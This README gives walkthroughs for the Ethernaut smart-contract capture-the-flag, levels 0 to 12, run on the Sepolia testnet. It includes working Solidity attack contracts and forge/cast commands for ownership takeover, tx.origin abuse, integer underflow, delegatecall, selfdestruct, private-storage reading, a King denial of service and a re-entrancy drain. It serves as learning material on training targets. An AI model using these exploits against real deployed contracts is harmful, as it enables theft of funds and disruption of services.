# Ethernaut-ctf-solutions

i'm using sepolia testnet for the transactions, u can choose testnet accordingly. All the instance code is in instances folder.

## level00 - Hello Ethernaut

1. As we can see all the functions are directing us to authenticate() fun. where we need to enter password.
2. we can get the password from console
   ```console
   await contract.password()
   ```
3. then we can either use console
   ```console
   await contract.authenticate("ethernaut0")
   ```
   or run our script file level00.s.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel00.sol";
import "forge-std/Script.sol";

contract Attacker is Script {
Instance level0 = Instance(0x3c9f001a0C769B5f70739443E9d83227a9Db976e);
   function run() external {
      vm.startBroadcast();
      level0.authenticate("ethernaut0");
      vm.stopBroadcast();
   }
}
```

```terminal
forge script ./script/level00.s.sol broadcast -vvvv --rpc-url $RPC_URL --private-key $PKEY
```

4. submit the instance, u're done

## level01 - Fallback

1. our main goal here is to be the owner and drain the contract balance, we can do this by two ways
   1. either keep contributing using contribute() to make your contribution
      more than the current owner and use withdraw() which is not a feasible
      solution obvi.
   2. or we can use the receive() fun. where we need to fulfill two basic conditions, msg.value>0 and contibutions[msg.sender]>0 , which is
      comparatively easy, then use withdraw(), so proceeding with this option
2. first we can use contribute() fun. to send some wei then use low level call
   function to make our msg.value>0
3. As both condition satisfies, we'll be the owner , now all we need to do is
   use withdraw() to get all the funds out.
4. checkout level01.s.sol for the code, run the script file on testnet
   ```terminal
   forge script ./script/level01.s.sol broadcast -vvvv --rpc-url $RPC_URL --private-key $PKEY
   ```
5. submit the instance , u're done

## level02 - Fallout

1. same as previous one we need to get the ownership here
2. we can achieve that by simply calling Fal1out() either from the console

```console
await contract.Fal1out()
```

or using script file level02.s.sol

```solidity
// SPDX-License-Identifier:MIT

pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../instances/Ilevel02.sol";

contract Attacker is Script {
    Fallout level2 = Fallout(0xE034b39E70D59f4b3b8881cD8Bbc3a4C86D26dC0);

    function run() external {
        vm.startBroadcast();
        console.log("previous owner: ", level2.owner());
        level2.Fal1out();
        console.log("updated owner: ", level2.owner());

        vm.stopBroadcast();
    }
}
```

3. submit the instance, u're done.

## level03 - Coin Flip

1. to complete this level we need to win 10 times in a row.
2. cuz the flip is calculated onchain using blockhash and block.number, we can predict outcome by stimulating coin flip on our custom smart contract, source code:

   ```solidity
   // SPDX-License-Identifier: MIT
   pragma solidity ^0.8.0;

   import "../instances/Ilevel03.sol";
   import {console} from "forge-std/console.sol";

   contract POC {
      CoinFlip level3 = CoinFlip(0xdabC2835a457e379FbB3748863D676e08A0df768);
      uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

      function exploit() external {
         uint256 blockValue = uint256(blockhash((block.number) - 1));
         uint256 coinFlip = blockValue / FACTOR;
         bool side = coinFlip == 1 ? true : false;

         level3.flip(side);
         console.log("Consecutive Wins: ", level3.consecutiveWins());
      }
   }
   ```

3. Deploy the contract
   ```
   forge create src/level03.sol:POC --rpc-url $RPC_URL --private-key $PKEY
   ```
4. Now we can call the exploit() function
   ```
   cast send $DEPLOYED_ADDRESS "exploit()" --rpc-url $RPC_URL --private-key $PKEY
   ```
   call it 10 times as we need to have 10 consecutive wins
5. u can even check if consecutiveWins is getting updated successfully
   ```
   cast call $LEVEL_ADDRESS "consecutiveWins()" --rpc-url $RPC_URL --private-key $PKEY
   ```
6. once consecutiveWins hits 10, submit the instance

## level04 - Telephone

1. goal is to claim ownership but there's a condition, tx.origin !=
   msg.sender
2. tx.origin always refers to the original sender (or the EOA), while msg.sender refers to the sender of the current message (or call) in the context of the contract
3. to do this, we'll use a proxy contract with source code:

   ```solidity
   // SPDX-License-Identifier: MIT
   pragma solidity ^0.8.0;
   import "../instances/Ilevel04.sol";

   contract Tele {
       Telephone level4 = Telephone(0x3d3F549676B9812D256F63C96b4b80FE06522736);
       function exploit() external {
           level4.changeOwner(0xB63bF09362065C621E3552D646F938662911f33a);
       }
   }
   ```

4. deploy our contract
   ```terminal
   forge create Tele --rpc-url $RPC_URL --private-key $PKEY
   ```
5. call the exploit function
   ```terminal
   cast call $DEPLOYED_ADDRESS "exploit()" --rpc-url $RPC_URL --private-key $PKEY
   ```
   here the tx.origin will be our address and msg.sender will be the address of contract we deployed rn
6. after being the owner, submit instance, u're done.

## level05 - Token

1. the goal here is to get our hands on any additional token
2. vulnerability lies here in the 2nd line of transfer function where it is deducting msg.sender's balance, as this contract uses older version of solidity it is prone to underflow/overflow.
3. so the hack is we'll cause an underflow by sending 21 tokens which will make balance[msg.sender] = 20 - 21 = max limit for uint256, and increase it by a large value
4. we can do this by calling transfer function either thru cast send command
   ```terminal
   cast send $LEVEL_ADDRESS "transfer(address _to, uint256 _value)" 0xb364AC25023f1859df404e4AE9aeC80Ab425b0C7 21 --rpc-url $RPC_URL --private-key $PKEY
   ```
   or using our script file level05.s.sol
   ```terminal
   forge script ./script/level05.s.sol broadcast -vvvv --rpc-url $RPC_URL --private-key $PKEY
   ```
5. submit the instance, u're done.

## level06 - Delegation

1. our goal here is to claim ownership of the given instance which we can do using pwn() fun.
2. We need to trigger the fallback function in the Delegation contract to invoke the pwn() function via msg.data which will then make a delegate call to pwn() and make msg.sender the owner.
3. to do this first we need to get methodId of pwn()
   ```terminal
   cast calldata "pwn()"
   ```
   then call the fallback fun.
   ```terminal
   cast send $LEVEL_ADDRESS 0xdd365b8b --gas-limit 50000 --rpc-url $RPC_URL --private-key $PKEY
   // we need to set a custom gas limit for this transaction as the default amount insufficient
   ```
4. send the transaction, submit instance, u're done

## level07 - Force

1. here we need to increase the balance of our contract, but neither it has any recieve() or fallback() fun. , so what we gonna use is selfdestruct()
2. preferably use remix, as new versions of solidity doesn't support selfdestruct(), source code:

   ```solidity
   // SPDX-License-Identifier: MIT
   pragma solidity ^0.6.0;

   contract Forced{
       constructor () public payable {
           selfdestruct(0x2BA0bf631A0c17C516D74634E24fCA5Fff21575f); //level add.
       }
   }
   ```

3. we'll send some eth at deployment time to increase contract balance and cuz of selfdestruct all this will go to Force contract
4. we're using selfdestruct() in constructor itself, so it can operate at deployment time and we don't need to call any other function
5. submit the instance after deployment, u're done.

## level08 - Vault

1. Nothing on the blockchain is considered to be private, not even private variables. Acc. to the contract
   1. storage slot 0 = locked
   2. storage slot 1 = password
2. So we can easily get the value of password by inspecting storage slot 1
   ```terminal
   cast storage $LEVEL_ADDRESS 1 --rpc-url $RPC_URL
   ```
3. Now pass the extracted password to unlock function

```
cast send $LEVEL_ADDRESS "unlock(bytes32 _password)" 0x412076657279207374726f6e67207365637265742070617373776f7264203a29 --rpc-url $RPC_URL --private-key $PKEY
```

4. submit the instance, u're done

## level09 - King

1. Acc. to contract we can be the king if we send more or equal value than prize value, but the issue is contract will regain kingship by reusing receive, so we need to do smthg that other's call to the receive() function fail.
2. so what we're going to do is create a contract with payable constructor to send minimum eth (1000000000000001 wei) to the king contract.
3. but the catch here is we won't add any receive() or fallback() fun. in our contract to handle ether transfer.
4. when this happens our contract will not be able to receive any ether thru the transfer function and it will cause a revert avoiding the self proclamation process by king contract.

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../instances/Ilevel09.sol";

contract UltimateKing {
    constructor(address king) payable {
        payable(king).call{value: msg.value}("");
    }
}
```

5. deploy the contract

```
forge create src/level09.sol:UltimateKing --constructor-args $LEVEL_ADDRESS --value 1000000000000001wei --rpc-url $RPC_URL --private-key $PKEY
```

6. submit the instance, u're done.

## level10 - Re-entrancy

1. Main cause of a re-entrancy attack is implementing ether transfer before deducting the balance. As we can see in the withdraw() function ether transfer is happening before reducing the balance of sender. An attacker can easily reenter back by recursively calling the vulnerable function.

2. so what we're going to do is create a contract, smthg like this

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../instances/Ilevel10.sol";

contract POCReentrance {
    Reentrance reentrance;
    uint256 amount = 0.001 ether;

    constructor(address payable _reentrance) {
        reentrance = Reentrance(_reentrance);
    }

    function attack() public payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(amount);
    }

    receive() external payable {
        if (address(reentrance).balance > 0) {
            reentrance.withdraw(amount);
        }
    }
}
```

3. Deploy it and give level address

```
forge create src/level10.sol:POCReentrance --constructor-args $LEVEL_ADDRESS --rpc-url $RPC_URL --private-key $PKEY
```

4. then we will call our attack() function with value 0.001 ether which will first call the donate() function as it is required to have balance greater or equal to the amount passed at the time of withdrawal.

5. after donate, attack() will call withdraw function. We will create a receive() function in our contract so when the withdraw() function tries to send us Ether, we can reenter back into the function by calling it again , this will keep on repeating until the other contract is drained and "balances[msg.sender] -= \_amount;" will never execute.

```
cast send $DEPLOYED_ADDRESS "attack()" --value 0.001ether --rpc-url $RPC_URL --private-key $PKEY
```

6. once it's done u can submit the instance.

## level11 - Elevator

1. the objective for this level is to reach the top floor or set top to true, we can see Elevator contract uses a Building interface which uses the address of msg.sender(aka. us) indicating we need to write implementation code for the interface.

2. to satisfy the condition for if block we need "building.isLastFloor(\_floor)" to return false cuz there's a negation in front of it and then to return true in second call as we need to set top to true.

3. so we'll create a contract with given code in src

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../instances/Ilevel11.sol";

contract Attack {
    Elevator elevator;
    bool isTopFloor = false;

    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }

    function attack() public {
        elevator.goTo(10);
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        bool swtich = isTopFloor;
        isTopFloor = !isTopFloor;
        return swtich;
    }
}
```

```
forge create src/level11.sol:Attack --constructor-args $LEVEL_ADDRESS --rpc-url $RPC_URL --private-key $PKEY
```

3. after deployment we'll make a call to our "attack()" function which will call the "goTo()" function internally and when goTo() makes the call to isLastFloor() it will return false in first go as we're setting switch to false for first time and then negating it to true for second call.

```
cast send $DEPLOYED_ADDRESS "attack()" --rpc-url $RPC_URL --private-key $PKEY
```

4. u can check if top was updated using this command

```
cast call $LEVEL_ADDRESS "top()" --rpc-url $RPC_URL --private-key $PKEY
```

if return value is 1 means top is set to true.

5. go on submit the instance, u're done.

## level12 - Privacy

1. to solve this level u need to have a good understanding of how storage slots work in evm.

2. every storage slot in evm has a capacity of 32 bytes and if multiple variables of size less than 32 bytes are declared one after another, they'll be packed in a single slot until it's full or if variable can't fit in the remaining space.

3. so as we can see here

```solidity
bool public locked = true;
uint256 public ID = block.timestamp;
uint8 private flattening = 10;
uint8 private denomination = 255;
uint16 private awkwardness = uint16(block.timestamp);
bytes32[3] private data;
```

- first storage slot aka. storage slot 0 = locked
- storage slot 1 = ID
- storage slot 2 = flattening , denomination, awkwardness(8+8+16 = 32)
- storage slot 3 = data[0]
- storage slot 4 = data[1]
- storage slot 5 = data[2]

4.  to unlock we want the value of data[2] , so we'll inspect storage slot 5 to get the value

```
cast storage 0xC006acd08aB81c842Be8c4F8a00fe3A7A85fb42e 5 --rpc-url $RPC_URL
```

```
0xdb301a79f36dbb45255b608d1bf403c4afd33c0da816c63b624d4904cc5a0533
```

5. now what we need to do is convert it to bytes16, use below function to do so

```solidity
function convert(bytes32 b) public pure returns (bytes16){
     return bytes16(b);
}
```

6. now pass the value u get after conversion to unlock() function

```
cast send $LEVEL_ADDRESS "unlock(bytes16 _key)"  0xdb301a79f36dbb45255b608d1bf403c4 --rpc-url $RPC_URL --private-key $PKEY
```

7. u can check if locked was successfully updated or not

```
cast storage $LEVEL_ADDRESS 0 --rpc-url $RPC_URL
```

if the value is 0 means it was updated successfully

8. submit the instance, u're done.
